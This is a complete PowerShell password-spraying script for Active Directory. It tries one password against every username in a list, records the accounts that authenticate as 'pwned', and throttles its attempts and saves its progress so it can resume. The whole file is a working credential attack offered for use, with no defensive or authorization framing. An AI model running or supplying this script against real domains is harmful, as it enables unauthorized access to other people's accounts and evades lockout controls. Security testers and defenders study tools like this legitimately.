<#
.SYNOPSIS
    Checks a list of usernames against a password and outputs pwned users.

.DESCRIPTION
    This script reads a list of usernames from a file, attempts to authenticate each 
    with the provided password, and logs which accounts are pwned. Supports resuming
    progress and throttling attempts with a delay.

.PARAMETER UserListFilePath
    Path to the text file containing usernames (one per line).

.PARAMETER Password
    Password to test against each username.

.PARAMETER OutputFilePath
    Path to the file where pwned usernames will be saved. Defaults to timestamped file.

.PARAMETER ResumeFilePath
    Path to the file storing progress index for resuming. Defaults to timestamped file.

.PARAMETER DelayBetweenAttempts
    Number of seconds to wait between each attempt. Default is 2 seconds.

.EXAMPLE
    .\Check-PwnedUsers.ps1 -U users.txt -P P@ssw0rd
#>

param (
    [Alias("U")]
    [string]$UserListFilePath,

    [Alias("P")]
    [string]$Password,

    [Alias("O")]
    [string]$OutputFilePath = "$(Get-Date -Format 'yyyyMMdd_HHmmss')_pwned_users.txt",

    [Alias("R")]
    [string]$ResumeFilePath = "$(Get-Date -Format 'yyyyMMdd_HHmmss')_resume_index.txt",

    [Alias("D")]
    [int]$DelayBetweenAttempts = 2
)

if (-Not (Test-Path $UserListFilePath)) {
    Write-Error "The specified user list file does not exist: $UserListFilePath"
    exit 1
}

$total = (Get-Content -Path $UserListFilePath).Count
$startIndex = 0
if (Test-Path $ResumeFilePath) {
    try {
        $startIndex = [int](Get-Content -Path $ResumeFilePath)
    } catch {
        Write-Warning "Could not read resume index. Starting from the beginning."
        $startIndex = 0
    }
}

$pwnedCount = 0

Get-Content -Path $UserListFilePath | Select-Object -Skip $startIndex | ForEach-Object {
    $username = $_
    $currentIndex = $startIndex + 1
    $remaining = $total - $currentIndex
    $percentComplete = [int](($currentIndex / $total) * 100)

    $status = "Processing $username ($currentIndex of $total, $remaining left) - Pwned: $pwnedCount"
    Write-Progress -Activity "Checking users" -Status $status -PercentComplete $percentComplete

    try {
        $directoryEntry = New-Object DirectoryServices.DirectoryEntry "", $username, $Password
        if ($directoryEntry.psbase.name) {
            Write-Host "$username has been pwned!" -ForegroundColor Green
            Add-Content -Path $OutputFilePath -Value $username
            $pwnedCount++
        }
    } catch {
        # Error is handled silently
    }

    Set-Content -Path $ResumeFilePath -Value $currentIndex
    Start-Sleep -Seconds $DelayBetweenAttempts

    $startIndex++
}

Write-Output "Done! Total pwned users: $pwnedCount"
Write-Output "Pwned usernames saved to: $OutputFilePath"
Write-Output "Resume progress saved to: $ResumeFilePath"
